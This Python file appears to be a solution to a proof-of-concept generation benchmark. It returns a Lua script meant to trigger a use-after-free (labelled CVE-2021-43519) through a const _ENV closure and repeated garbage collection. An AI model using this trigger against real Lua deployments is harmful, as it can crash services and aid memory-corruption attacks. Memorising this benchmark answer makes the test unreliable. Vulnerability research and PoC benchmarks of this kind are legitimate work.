import os

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.

        Args:
            src_path: Path to the vulnerable source code tarball

        Returns:
            bytes: The PoC input that should trigger the vulnerability
        """
        # The vulnerability (CVE-2021-43519) is a use-after-free in Lua's bytecode
        # compiler, triggered when a closure captures a const _ENV upvalue.
        #
        # PoC Logic:
        # 1. Create a function `Factory` that establishes a scope.
        # 2. Inside `Factory`, declare many local variables to influence the compiler's
        #    state and register allocation, a common technique for triggering compiler bugs.
        # 3. Declare `local _ENV <const> = { ... }`. This is the core trigger.
        # 4. Create a nested closure `PocFunc` that captures this `_ENV`. This closure
        #    will be called after its parent functions have been garbage collected.
        # 5. The function objects for `Factory` and its inner function are allowed to go
        #    out of scope, making them eligible for garbage collection.
        # 6. Force garbage collection (`collectgarbage`) to free the memory associated
        #    with the parent functions. The bug causes the upvalue description needed by
        #    `PocFunc` to be incorrectly freed as well. This is the "Free".
        # 7. Call `PocFunc`. This attempts to access the captured environment via a
        #    dangling pointer, causing a crash. This is the "Use".
        
        poc_script = b"""function Factory()
    local l00,l01,l02,l03,l04,l05,l06,l07,l08,l09
    local l10,l11,l12,l13,l14,l15,l16,l17,l18,l19
    local l20,l21,l22,l23,l24,l25,l26,l27,l28,l29
    local l30,l31,l32,l33,l34,l35,l36,l37,l38,l39
    local l40,l41,l42,l43,l44,l45,l46,l47,l48,l49
    l00=function()end;l01=function()end;l02=function()end;l03=function()end;l04=function()end
    l05=function()end;l06=function()end;l07=function()end;l08=function()end;l09=function()end

    local _ENV <const> = { secret_value = 1337 }

    local function Inner()
        local x = 1
        for i = 1, 10 do
            x = x * i + (i % 3)
        end
        
        local poc = function()
            if secret_value > 0 then
                return secret_value
            else
                return 0
            end
        end
        return poc
    end
    
    return Inner
end

F = Factory()
PocFunc = F()

for i = 1, 4000 do
    collectgarbage("collect")
end

PocFunc()
"""
        return poc_script